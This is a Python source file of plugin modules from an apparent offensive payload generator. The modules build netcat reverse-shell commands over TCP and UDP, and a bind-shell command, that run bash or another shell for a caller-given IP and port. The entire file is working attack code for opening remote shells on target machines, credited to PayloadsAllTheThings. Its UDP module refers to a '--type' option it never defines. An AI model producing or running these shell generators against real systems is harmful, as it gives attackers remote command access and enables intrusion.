from ogabog.cores import plugin, const


class ReverseShell(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--type",
            default="ncat",
            choices=[
                'nc',
                'ncat'
            ],
            help="Select netcat type: tradition, ncat (default: ncat)"
        )
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.add_args(
            "--ip",
            help="IP address",
            required=True
        )
        self.add_args(
            "--port",
            help="Port address",
            required=True
        )
        self.opts.description = "[ReverseShell][TCP] Netcat from swisskyrepo/PayloadsAllTheThings. License MIT."

    def make_shell(self):
        self.shell = "{} {} {} -e {}".format(self.args.type, self.args.ip, self.args.port, self.args.shell)


class ReverseShellUDP(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.add_args(
            "--ip",
            help="IP address",
            required=True
        )
        self.add_args(
            "--port",
            help="Port address",
            required=True
        )
        self.opts.description = "[ReverseShell][UDP] Netcat from swisskyrepo/PayloadsAllTheThings. License MIT."

    def make_shell(self):
        self.shell = "{} --udp {} {} -e {}".format(self.args.type, self.args.ip, self.args.port, self.args.shell)


class BindShell(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.add_args(
            "--type",
            default="ncat",
            choices=[
                'nc',
                'ncat'
            ],
            help="Select netcat type: tradition, ncat (default: ncat)"
        )
        self.add_args(
            "--port",
            help="Port address",
            required=True
        )
        self.opts.description = "[BindShell][TCP] Netcat from swisskyrepo/PayloadsAllTheThings. License MIT."

    def make_shell(self):
        self.shell = "{} -l {} -e {}".format(self.args.type, self.args.port, self.args.shell)
